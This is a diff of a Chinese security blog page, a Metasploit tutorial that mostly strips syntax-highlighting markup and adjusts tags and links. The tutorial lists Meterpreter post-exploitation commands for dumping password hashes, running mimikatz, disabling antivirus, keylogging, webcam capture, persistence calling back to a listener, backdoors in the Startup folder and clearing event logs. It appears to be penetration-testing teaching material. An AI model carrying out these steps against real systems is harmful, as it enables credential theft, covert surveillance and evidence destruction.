@@ -26,8 +26,7 @@
     
     <script src="/libs/jquery/jquery.min.js"></script>
     
-<link rel="alternate" href="/atom.xml" title="谢公子的小黑屋" type="application/atom+xml">
-<link rel="stylesheet" href="/css/prism-tomorrow.css" type="text/css"></head>
+</head>
 
 
 <body>
@@ -81,6 +80,13 @@
         <a href="/tags/%E5%B7%A5%E5%85%B7%E7%9A%84%E4%BD%BF%E7%94%A8/">
           
           <span>工具的使用</span>
+        </a>
+      </li>
+      
+      <li>
+        <a href="/tags/Windows/">
+          
+          <span>Windows系统</span>
         </a>
       </li>
       
@@ -215,6 +221,14 @@
                   <a href="/tags/%E5%B7%A5%E5%85%B7%E7%9A%84%E4%BD%BF%E7%94%A8/ " style="margin-left:75px";>
 				  
 		          <span>工具的使用</span>
+                  </a>
+                </li>
+              
+                <li>   
+				
+                  <a href="/tags/Windows/ " style="margin-left:75px";>
+				  
+		          <span>Windows系统</span>
                   </a>
                 </li>
                
@@ -493,17 +507,17 @@
 <p><img src="https://img-blog.csdnimg.cn/20191109220725658.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70" alt="img"></p>
 <h2 id="Metasploit的安装和升级"><a href="#Metasploit的安装和升级" class="headerlink" title="Metasploit的安装和升级"></a>Metasploit的安装和升级</h2><p>在一般的linux中，默认是不安装MSF的。以下是在非kali的Linux下安装MSF框架。</p>
 <p><strong>一键安装</strong></p>
-<pre class=" language-python"><code class="language-python">curl https<span class="token punctuation">:</span><span class="token operator">//</span>raw<span class="token punctuation">.</span>githubusercontent<span class="token punctuation">.</span>com<span class="token operator">/</span>rapid7<span class="token operator">/</span>metasploit<span class="token operator">-</span>omnibus<span class="token operator">/</span>master<span class="token operator">/</span>config<span class="token operator">/</span>templates<span class="token operator">/</span>metasploit<span class="token operator">-</span>framework<span class="token operator">-</span>wrappers<span class="token operator">/</span>msfupdate<span class="token punctuation">.</span>erb <span class="token operator">></span> msfinstall <span class="token operator">&amp;</span><span class="token operator">&amp;</span> chmod <span class="token number">755</span> msfinstall <span class="token operator">&amp;</span><span class="token operator">&amp;</span> <span class="token punctuation">.</span><span class="token operator">/</span>msfinstall   
-adduser msf           <span class="token comment" spellcheck="true">#添加msf用户</span>
-su msf                <span class="token comment" spellcheck="true">#切换到msf用户</span>
-cd  <span class="token operator">/</span>opt<span class="token operator">/</span>metasploit<span class="token operator">-</span>framework<span class="token operator">/</span>bin   <span class="token comment" spellcheck="true">#切换到msf所在的目录 </span>
-<span class="token punctuation">.</span><span class="token operator">/</span>msfconsole          <span class="token comment" spellcheck="true">#以后启动msfconsole，都切换到msf用户下启动，这样会同步数据库。如果使用root用户启动的话，不会同步数据库  </span>
+<pre><code class="python">curl https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb &gt; msfinstall &amp;&amp; chmod 755 msfinstall &amp;&amp; ./msfinstall   
+adduser msf           #添加msf用户
+su msf                #切换到msf用户
+cd  /opt/metasploit-framework/bin   #切换到msf所在的目录 
+./msfconsole          #以后启动msfconsole，都切换到msf用户下启动，这样会同步数据库。如果使用root用户启动的话，不会同步数据库  
 
 也可以将msfconsole加入到执行目录下，这样在任何目录直接msfconsole就可以了
-ln <span class="token operator">-</span>s <span class="token operator">/</span>opt<span class="token operator">/</span>metasploit<span class="token operator">-</span>framework<span class="token operator">/</span>bin<span class="token operator">/</span>msfconsole <span class="token operator">/</span>usr<span class="token operator">/</span>bin<span class="token operator">/</span>msfconsole
+ln -s /opt/metasploit-framework/bin/msfconsole /usr/bin/msfconsole
 
-<span class="token comment" spellcheck="true">#备注：</span>
-<span class="token comment" spellcheck="true">#初次运行msf会创建数据库，但是msf默认使用的PostgreSQL数据库不能与root用户关联，这也这也就是需要新建用户msf来运行metasploit的原因所在。如果你一不小心手一抖，初次运行是在root用户下，请使用 msfdb reinit 命令，然后使用非root用户初始化数据库。        </span>
+#备注：
+#初次运行msf会创建数据库，但是msf默认使用的PostgreSQL数据库不能与root用户关联，这也这也就是需要新建用户msf来运行metasploit的原因所在。如果你一不小心手一抖，初次运行是在root用户下，请使用 msfdb reinit 命令，然后使用非root用户初始化数据库。        
 
 MSF后期的升级：msfupdate</code></pre>
 <p><strong>使用方法：</strong></p>
@@ -547,13 +561,13 @@ MSF后期的升级：msfupdate</code></pre>
 <li>Stage是Stager Payload下的一种Payload组件，这种Payload可以提供更加高级的功能，而且没有大小限制。</li>
 </ul>
 <p>在 Metasploit 中，我们可以通过Payload的名称和使用格式来推断它的类型：</p>
-<pre class=" language-bash"><code class="language-bash">Single Payload的格式为：<span class="token operator">&lt;</span>target<span class="token operator">></span>/ <span class="token operator">&lt;</span>single<span class="token operator">></span>  如：windows/powershell_bind_tcp
-Stager/Stage Payload的格式为：<span class="token operator">&lt;</span>target<span class="token operator">></span>/ <span class="token operator">&lt;</span>stage<span class="token operator">></span> / <span class="token operator">&lt;</span>stager<span class="token operator">></span>  如：windows/meterpreter/reverse_tcp</code></pre>
+<pre><code class="bash">Single Payload的格式为：&lt;target&gt;/ &lt;single&gt;  如：windows/powershell_bind_tcp
+Stager/Stage Payload的格式为：&lt;target&gt;/ &lt;stage&gt; / &lt;stager&gt;  如：windows/meterpreter/reverse_tcp</code></pre>
 <p>当我们在Metasploit中执行 show payloads 命令之后，它会给我们显示一个可使用的Payload列表：</p>
 <p>在这个列表中，像 windows/powershell_bind_tcp 就是一个Single Payload，它不包含Stage Payload</p>
 <p>而 windows/meterpreter/reverse_tcp 则由一个<strong>Stage Payload（meterpreter</strong>）和 一个<strong>Stager Payload（reverse_tcp）</strong>组成</p>
 <p><strong>Stager中几种常见的payload</strong></p>
-<pre class=" language-Swift"><code class="language-Swift">windows/meterpreter/bind_tcp       #正向连接
+<pre><code class="Swift">windows/meterpreter/bind_tcp       #正向连接
 windows/meterpreter/reverse_tcp    #反向连接，常用
 windows/meterpreter/reverse_http   #通过监听80端口反向连接
 windows/meterpreter/reverse_https  #通过监听443端口反向连接
@@ -617,52 +631,52 @@ windows/meterpreter/reverse_https  #通过监听443端口反向连接
 <p>输入： sessions -l    查看我们获得的shell，前面有id</p>
 <p>输入： session -i 1   即可切换到id为1的shell</p>
 <p><img src="/medias/wz/MSF%E7%9A%84%E7%94%A8%E6%B3%95/16.png" alt="16"></p>
-<pre class=" language-python"><code class="language-python">sysinfo             <span class="token comment" spellcheck="true">#查看目标主机系统信息</span>
-run scraper         <span class="token comment" spellcheck="true">#查看目标主机详细信息</span>
-run hashdump        <span class="token comment" spellcheck="true">#导出密码的哈希</span>
-load kiwi           <span class="token comment" spellcheck="true">#加载mimikatz</span>
-ps                  <span class="token comment" spellcheck="true">#查看目标主机进程信息</span>
-pwd                 <span class="token comment" spellcheck="true">#查看目标当前目录(windows)</span>
-getlwd              <span class="token comment" spellcheck="true">#查看目标当前目录(Linux)</span>
-search <span class="token operator">-</span>f <span class="token operator">*</span><span class="token punctuation">.</span>jsp <span class="token operator">-</span>d e<span class="token punctuation">:</span>\                <span class="token comment" spellcheck="true">#搜索E盘中所有以.jsp为后缀的文件</span>
-download  e<span class="token punctuation">:</span>\test<span class="token punctuation">.</span>txt  <span class="token operator">/</span>root          <span class="token comment" spellcheck="true">#将目标机的e:\test.txt文件下载到/root目录下</span>
-upload    <span class="token operator">/</span>root<span class="token operator">/</span>test<span class="token punctuation">.</span>txt d<span class="token punctuation">:</span>\test      <span class="token comment" spellcheck="true">#将/root/test.txt上传到目标机的 d:\test\ 目录下</span>
-getpid              <span class="token comment" spellcheck="true">#查看当前Meterpreter Shell的进程PID</span>
-migrate <span class="token number">1384</span>        <span class="token comment" spellcheck="true">#将当前Meterpreter Shell的进程迁移到PID为1384的进程上</span>
-idletime            <span class="token comment" spellcheck="true">#查看主机运行时间</span>
-getuid              <span class="token comment" spellcheck="true">#查看获取的当前权限</span>
-getsystem           <span class="token comment" spellcheck="true">#提权</span>
-run  killav         <span class="token comment" spellcheck="true">#关闭杀毒软件</span>
-screenshot          <span class="token comment" spellcheck="true">#截图</span>
-webcam_list         <span class="token comment" spellcheck="true">#查看目标主机的摄像头</span>
-webcam_snap         <span class="token comment" spellcheck="true">#拍照</span>
-webcam_stream       <span class="token comment" spellcheck="true">#开视频</span>
-execute  参数  <span class="token operator">-</span>f 可执行文件   <span class="token comment" spellcheck="true">#执行可执行程序</span>
-run getgui <span class="token operator">-</span>u hack <span class="token operator">-</span>p <span class="token number">123</span>    <span class="token comment" spellcheck="true">#创建hack用户，密码为123</span>
-run getgui <span class="token operator">-</span>e                <span class="token comment" spellcheck="true">#开启远程桌面</span>
-keyscan_start                <span class="token comment" spellcheck="true">#开启键盘记录功能</span>
-keyscan_dump                 <span class="token comment" spellcheck="true">#显示捕捉到的键盘记录信息</span>
-keyscan_stop                 <span class="token comment" spellcheck="true">#停止键盘记录功能</span>
-uictl  disable  keyboard     <span class="token comment" spellcheck="true">#禁止目标使用键盘</span>
-uictl  enable   keyboard     <span class="token comment" spellcheck="true">#允许目标使用键盘</span>
-uictl  disable  mouse        <span class="token comment" spellcheck="true">#禁止目标使用鼠标</span>
-uictl  enable   mouse        <span class="token comment" spellcheck="true">#允许目标使用鼠标</span>
-load                         <span class="token comment" spellcheck="true">#使用扩展库</span>
-run                             <span class="token comment" spellcheck="true">#使用扩展库</span>
+<pre><code class="python">sysinfo             #查看目标主机系统信息
+run scraper         #查看目标主机详细信息
+run hashdump        #导出密码的哈希
+load kiwi           #加载mimikatz
+ps                  #查看目标主机进程信息
+pwd                 #查看目标当前目录(windows)
+getlwd              #查看目标当前目录(Linux)
+search -f *.jsp -d e:\                #搜索E盘中所有以.jsp为后缀的文件
+download  e:\test.txt  /root          #将目标机的e:\test.txt文件下载到/root目录下
+upload    /root/test.txt d:\test      #将/root/test.txt上传到目标机的 d:\test\ 目录下
+getpid              #查看当前Meterpreter Shell的进程PID
+migrate 1384        #将当前Meterpreter Shell的进程迁移到PID为1384的进程上
+idletime            #查看主机运行时间
+getuid              #查看获取的当前权限
+getsystem           #提权
+run  killav         #关闭杀毒软件
+screenshot          #截图
+webcam_list         #查看目标主机的摄像头
+webcam_snap         #拍照
+webcam_stream       #开视频
+execute  参数  -f 可执行文件   #执行可执行程序
+run getgui -u hack -p 123    #创建hack用户，密码为123
+run getgui -e                #开启远程桌面
+keyscan_start                #开启键盘记录功能
+keyscan_dump                 #显示捕捉到的键盘记录信息
+keyscan_stop                 #停止键盘记录功能
+uictl  disable  keyboard     #禁止目标使用键盘
+uictl  enable   keyboard     #允许目标使用键盘
+uictl  disable  mouse        #禁止目标使用鼠标
+uictl  enable   mouse        #允许目标使用鼠标
+load                         #使用扩展库
+run                             #使用扩展库
 
-run persistence <span class="token operator">-</span>X <span class="token operator">-</span>i <span class="token number">5</span> <span class="token operator">-</span>p <span class="token number">8888</span> <span class="token operator">-</span>r <span class="token number">192.168</span><span class="token punctuation">.</span><span class="token number">10.27</span>        <span class="token comment" spellcheck="true">#反弹时间间隔是5s 会自动连接192.168.27的4444端口，缺点是容易被杀毒软件查杀</span>
-portfwd add <span class="token operator">-</span>l <span class="token number">3389</span> <span class="token operator">-</span>r <span class="token number">192.168</span><span class="token punctuation">.</span><span class="token number">11.13</span> <span class="token operator">-</span>p <span class="token number">3389</span>     <span class="token comment" spellcheck="true">#将192.168.11.13的3389端口转发到本地的3389端口上，这里的192.168.11.13是获取权限的主机的ip地址</span>
-clearev                       <span class="token comment" spellcheck="true">#清除日志</span></code></pre>
+run persistence -X -i 5 -p 8888 -r 192.168.10.27        #反弹时间间隔是5s 会自动连接192.168.27的4444端口，缺点是容易被杀毒软件查杀
+portfwd add -l 3389 -r 192.168.11.13 -p 3389     #将192.168.11.13的3389端口转发到本地的3389端口上，这里的192.168.11.13是获取权限的主机的ip地址
+clearev                       #清除日志</code></pre>
 <h3 id="Post-后渗透模块"><a href="#Post-后渗透模块" class="headerlink" title="Post 后渗透模块"></a>Post 后渗透模块</h3><p>该模块主要用于在取得目标主机系统远程控制权后，进行一系列的后渗透攻击动作。</p>
-<pre class=" language-python"><code class="language-python">run post<span class="token operator">/</span>windows<span class="token operator">/</span>manage<span class="token operator">/</span>migrate           <span class="token comment" spellcheck="true">#自动进程迁移</span>
-run post<span class="token operator">/</span>windows<span class="token operator">/</span>gather<span class="token operator">/</span>checkvm           <span class="token comment" spellcheck="true">#查看目标主机是否运行在虚拟机上</span>
-run post<span class="token operator">/</span>windows<span class="token operator">/</span>manage<span class="token operator">/</span>killav            <span class="token comment" spellcheck="true">#关闭杀毒软件</span>
-run post<span class="token operator">/</span>windows<span class="token operator">/</span>manage<span class="token operator">/</span>enable_rdp        <span class="token comment" spellcheck="true">#开启远程桌面服务</span>
-run post<span class="token operator">/</span>windows<span class="token operator">/</span>manage<span class="token operator">/</span>autoroute         <span class="token comment" spellcheck="true">#查看路由信息</span>
-run post<span class="token operator">/</span>windows<span class="token operator">/</span>gather<span class="token operator">/</span>enum_logged_on_users    <span class="token comment" spellcheck="true">#列举当前登录的用户</span>
-run post<span class="token operator">/</span>windows<span class="token operator">/</span>gather<span class="token operator">/</span>enum_applications       <span class="token comment" spellcheck="true">#列举应用程序</span>
-run windows<span class="token operator">/</span>gather<span class="token operator">/</span>credentials<span class="token operator">/</span>windows_autologin <span class="token comment" spellcheck="true">#抓取自动登录的用户名和密码</span>
-run windows<span class="token operator">/</span>gather<span class="token operator">/</span>smart_hashdump               <span class="token comment" spellcheck="true">#dump出所有用户的hash</span></code></pre>
+<pre><code class="python">run post/windows/manage/migrate           #自动进程迁移
+run post/windows/gather/checkvm           #查看目标主机是否运行在虚拟机上
+run post/windows/manage/killav            #关闭杀毒软件
+run post/windows/manage/enable_rdp        #开启远程桌面服务
+run post/windows/manage/autoroute         #查看路由信息
+run post/windows/gather/enum_logged_on_users    #列举当前登录的用户
+run post/windows/gather/enum_applications       #列举应用程序
+run windows/gather/credentials/windows_autologin #抓取自动登录的用户名和密码
+run windows/gather/smart_hashdump               #dump出所有用户的hash</code></pre>
 <p>输入：sysinfo  查看目标主机的信息</p>
 <p><img src="/medias/wz/MSF%E7%9A%84%E7%94%A8%E6%B3%95/17.png" alt="17"></p>
 <h3 id="查看主机是否运行在虚拟机上"><a href="#查看主机是否运行在虚拟机上" class="headerlink" title="查看主机是否运行在虚拟机上"></a>查看主机是否运行在虚拟机上</h3><pre><code>run post/windows/gather/checkvm</code></pre><p><img src="https://img-blog.csdnimg.cn/20190613151852676.png" alt="img"></p>
@@ -778,30 +792,30 @@ run windows<span class="token operator">/</span>gather<span class="token operato
 <p><strong>启动项启动</strong></p>
 <p>启动项启动的话，我们先生成一个后门工具，传送门——&gt; <a href="https://blog.csdn.net/qq_36119192/article/details/83869141" target="_blank" rel="noopener">用MSF生成一个后门木马</a></p>
 <p>然后放到windows的启动目录中：</p>
-<pre class=" language-Swift"><code class="language-Swift">C:\Users\$username$\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup</code></pre>
+<pre><code class="Swift">C:\Users\$username$\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup</code></pre>
 <p>这样这个后门每次开机就都能启动了，然后我们只要相连就监听相应的端口就行了。</p>
 <p><strong>服务启动</strong></p>
 <p>通过服务启动，我们可以运行命令 </p>
-<pre class=" language-python"><code class="language-python">run persistence <span class="token operator">-</span>X <span class="token operator">-</span>i <span class="token number">5</span> <span class="token operator">-</span>p <span class="token number">8888</span> <span class="token operator">-</span>r <span class="token number">192.168</span><span class="token punctuation">.</span><span class="token number">10.27</span>  <span class="token comment" spellcheck="true">#反弹时间间隔是5s 会自动连接192.168.27的4444端口，缺点是容易被杀毒软件查杀</span>
+<pre><code class="python">run persistence -X -i 5 -p 8888 -r 192.168.10.27  #反弹时间间隔是5s 会自动连接192.168.27的4444端口，缺点是容易被杀毒软件查杀
 
-<span class="token comment" spellcheck="true">#然后它就在目标机新建了这个文件：C:\Windows\TEMP\CJzhFlNOWa.vbs ，并把该服务加入了注册表中，只要开机就会启动</span></code></pre>
+#然后它就在目标机新建了这个文件：C:\Windows\TEMP\CJzhFlNOWa.vbs ，并把该服务加入了注册表中，只要开机就会启动</code></pre>
 <p><img src="https://img-blog.csdnimg.cn/20181201230103980.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70" alt="img"> 我们在被攻击机可以看到这个文件，是一个VBScript脚本</p>
 <p><img src="https://img-blog.csdnimg.cn/20181201230206493.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70" alt="img"></p>
 <p>查看靶机的端口连接情况，可以看到靶机连着我们的8888端口</p>
 <p><img src="https://img-blog.csdnimg.cn/20181201230653161.png" alt="img"></p>
 <h3 id="portfwd端口转发"><a href="#portfwd端口转发" class="headerlink" title="portfwd端口转发"></a>portfwd端口转发</h3><p>portfwd 是meterpreter提供的一种基本的端口转发。porfwd可以反弹单个端口到本地，并且监听，使用方法如下</p>
-<pre class=" language-python"><code class="language-python">portfwd add <span class="token operator">-</span>l <span class="token number">3389</span> <span class="token operator">-</span>r <span class="token number">192.168</span><span class="token punctuation">.</span><span class="token number">11.13</span> <span class="token operator">-</span>p <span class="token number">3389</span>     <span class="token comment" spellcheck="true">#将192.168.11.13的3389端口转发到本地的3389端口上，这里的192.168.11.13是获取权限的主机的ip地址</span></code></pre>
+<pre><code class="python">portfwd add -l 3389 -r 192.168.11.13 -p 3389     #将192.168.11.13的3389端口转发到本地的3389端口上，这里的192.168.11.13是获取权限的主机的ip地址</code></pre>
 <h3 id=""><a href="#" class="headerlink" title=""></a><img src="https://img-blog.csdnimg.cn/2019061717491545.png" alt="img"></h3><p>然后我们只要访问本地的3389端口就可以连接到目标主机的3389端口了</p>
-<pre class=" language-python"><code class="language-python">rdesktop <span class="token number">127.0</span><span class="token punctuation">.</span><span class="token number">0.1</span><span class="token punctuation">:</span><span class="token number">3389</span></code></pre>
+<pre><code class="python">rdesktop 127.0.0.1:3389</code></pre>
 <p><img src="https://img-blog.csdnimg.cn/20190617175054738.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70" alt="img"></p>
 <h3 id="清除事件日志"><a href="#清除事件日志" class="headerlink" title="清除事件日志"></a>清除事件日志</h3><p>完成攻击操作之后，千万别忘了“打扫战场”。我们的所有操作都会被记录在目标系统的日志文件之中，因此我们需要在完成攻击之后使用命令 clearev 命令来清除事件日志：</p>
 <p><img src="/medias/wz/MSF%E7%9A%84%E7%94%A8%E6%B3%95/25.png" alt="25"></p>
 <h2 id="导入并执行PowerShell脚本"><a href="#导入并执行PowerShell脚本" class="headerlink" title="导入并执行PowerShell脚本"></a>导入并执行PowerShell脚本</h2><p>如果powershell脚本是用于域内信息收集的，则获取到的权限用户需要是域用户</p>
-<pre class=" language-python"><code class="language-python">load powershell            <span class="token comment" spellcheck="true">#加载powershell功能</span>
-powershell_import <span class="token operator">/</span>root<span class="token operator">/</span>PowerView<span class="token punctuation">.</span>ps1      <span class="token comment" spellcheck="true">#导入powershell脚本，提前将该powershell脚本放到指定目录</span>
-powershell_execute Get<span class="token operator">-</span>NetDomain     <span class="token comment" spellcheck="true">#执行该脚本下的功能模块Get-domain，该模块用于获取域信息，一个脚本下通常有多个功能模块</span>
-powershell_execute Invoke<span class="token operator">-</span>UserHunter  <span class="token comment" spellcheck="true">#该功能模块用于定位域管理员登录的主机</span>
-powershell_execute Get<span class="token operator">-</span>NetForest      <span class="token comment" spellcheck="true">#该模块用于定位域信息</span></code></pre>
+<pre><code class="python">load powershell            #加载powershell功能
+powershell_import /root/PowerView.ps1      #导入powershell脚本，提前将该powershell脚本放到指定目录
+powershell_execute Get-NetDomain     #执行该脚本下的功能模块Get-domain，该模块用于获取域信息，一个脚本下通常有多个功能模块
+powershell_execute Invoke-UserHunter  #该功能模块用于定位域管理员登录的主机
+powershell_execute Get-NetForest      #该模块用于定位域信息</code></pre>
 <p><img src="https://img-blog.csdnimg.cn/20191117223257131.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70" alt="img"></p>
 <p><img src="https://img-blog.csdnimg.cn/20191117223610465.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70" alt="img"></p>
 <h2 id="升级Session"><a href="#升级Session" class="headerlink" title="升级Session"></a>升级Session</h2><p>有时候，当我们收到的不是meterpreter类型的session的话，可能不好操作。我们可以执行命令 <strong>sessions -u id</strong> 来升级session。</p>
@@ -835,25 +849,7 @@ powershell_execute Get<span class="token operator">-</span>NetForest      <span 
 <p>  <strong>timestomp</strong>   Manipulate file MACE attributes</p>
 <p>相关文章：<a href="https://blog.csdn.net/qq_36119192/article/details/83869141" target="_blank" rel="noopener">Msfvenonm生成一个后门木马</a></p>
 <p>​         <a href="https://blog.csdn.net/qq_36119192/article/details/89489609" target="_blank" rel="noopener">渗透测试神器Cobalt Strike的使用</a></p>
-<script>
-        document.querySelectorAll('.github-emoji')
-          .forEach(el => {
-            if (!el.dataset.src) { return; }
-            const img = document.createElement('img');
-            img.style = 'display:none !important;';
-            img.src = el.dataset.src;
-            img.addEventListener('error', () => {
-              img.remove();
-              el.style.color = 'inherit';
-              el.style.backgroundImage = 'none';
-              el.style.background = 'none';
-            });
-            img.addEventListener('load', () => {
-              img.remove();
-            });
-            document.body.appendChild(img);
-          });
-      </script>
+
             </div>
             <hr/>
 
@@ -878,7 +874,7 @@ powershell_execute Get<span class="token operator">-</span>NetForest      <span 
                     </i>
                 </span>
                 <span class="reprint-info">
-                    <a href="http://xiaoxie.love/2018/10/24/metasploit-framework-msf-de-shi-yong/">http://xiaoxie.love/2018/10/24/metasploit-framework-msf-de-shi-yong/</a>
+                    <a href="http://xiaoxie.love/2018/10/24/Metasploit%20Framework(MSF)%E7%9A%84%E4%BD%BF%E7%94%A8/">http://xiaoxie.love/2018/10/24/Metasploit%20Framework(MSF)%E7%9A%84%E4%BD%BF%E7%94%A8/</a>
                 </span>
             </div>
             <div class="reprint__notice">
@@ -1229,7 +1225,7 @@ powershell_execute Get<span class="token operator">-</span>NetForest      <span 
             <div class="article-badge left-badge text-color">
                 <i class="fas fa-chevron-left"></i>&nbsp;上一篇</div>
             <div class="card">
-                <a href="/2019/01/12/windows-ren-zheng-ti-xi-jie-du/">
+                <a href="/2019/01/12/Windows%E8%AE%A4%E8%AF%81%E4%BD%93%E7%B3%BB%E8%A7%A3%E8%AF%BB/">
                     <div class="card-image">
                         
                         <img src="https://timgsa.baidu.com/timg?image&amp;quality=80&amp;size=b9999_10000&amp;sec=1574274117107&amp;di=e8747d60c6562980e50624ed70de8b02&amp;imgtype=0&amp;src=http%3A%2F%2Fyesofcorsa.com%2Fwp-content%2Fuploads%2F2016%2F12%2F4k-Windows-10-Wallpaper-Best.jpg" class="responsive-img" alt="Windows认证体系解读">
@@ -1277,7 +1273,7 @@ powershell_execute Get<span class="token operator">-</span>NetForest      <span 
                 本篇&nbsp;<i class="far fa-dot-circle"></i>
             </div>
             <div class="card">
-                <a href="/2018/10/24/metasploit-framework-msf-de-shi-yong/">
+                <a href="/2018/10/24/Metasploit%20Framework(MSF)%E7%9A%84%E4%BD%BF%E7%94%A8/">
                     <div class="card-image">
                         
                         <img src="https://timgsa.baidu.com/timg?image&amp;quality=80&amp;size=b9999_10000&amp;sec=1574223267058&amp;di=5c055215bf5f59519a2d392286badf6f&amp;imgtype=0&amp;src=http%3A%2F%2Fstatic.open-open.com%2Fnews%2FuploadImg%2F20170206%2F20170206105011_808.jpg" class="responsive-img" alt="Metasploit Framework(MSF)的使用">
@@ -1670,6 +1666,6 @@ $(function () {
     <script src="/libs/instantpage/instantpage.js" type="module"></script>
     
 
-</body>
+<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"log":false,"pluginJsPath":"lib/","pluginModelPath":"assets/","pluginRootPath":"live2dw/","tagMode":false});</script></body>
 
 </html>
